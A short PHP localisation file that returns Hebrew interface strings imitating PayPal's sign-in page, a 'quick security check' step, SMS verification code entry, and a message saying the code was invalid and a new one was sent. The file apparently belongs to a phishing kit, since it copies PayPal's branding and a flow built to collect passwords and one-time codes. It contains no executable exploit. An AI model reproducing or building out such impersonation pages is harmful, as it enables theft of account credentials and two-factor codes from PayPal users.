<?php

function lang($phrase){
    static $lang = array(
        '1' => 'התחבר לחשבון ה-PayPal שלך',
        '2' => 'כתובת דוא"ל או מספר טלפון נייד',
        '3' => 'סיסמה',
        '4' => 'שכחת סיסמה?',
        '5' => 'התחברות',
        '6' => 'או',
        '7' => 'הרשמה',
        '8' => 'אנגלית',
        '9' => 'צרפתית',
        '10' => 'ספרדית',
        '11' => '文',
        '12' => 'בדיקת אבטחה מהירה',
        '13' => 'אנו רק צריכים מידע נוסף כדי לאמת שזה אתה.',
        '14' => 'קבלת הודעת טקסט',
        '15' => 'בהמשך, אתה מאשר שאתה מורשה להשתמש במספר הטלפון הזה ומסכים לקבל הודעות טקסט לאימות זהותך במהלך הסשן. יישאו דמי מנוי על ההודעות. ייתכן שנקבל פרטי מנוי והתקן ממפעיל האלחוט שלך לשימושים של סיכון והונאה.',
        '16' => 'הבא',
        '17' => 'הקלד את הקוד שלך.',
        '18' => 'שליחה מחדש',
        '19' => 'המשך',
        '20' => 'צור קשר',
        '21' => 'פרטיות',
        '22' => 'משפטי',
        '23' => 'עדכוני מדיניות',
        '24' => 'בכל העולם',
        '25' => 'קוד לא תקין. שלחנו לך קוד חדש.',
    );

    return $lang[$phrase];
}
?>
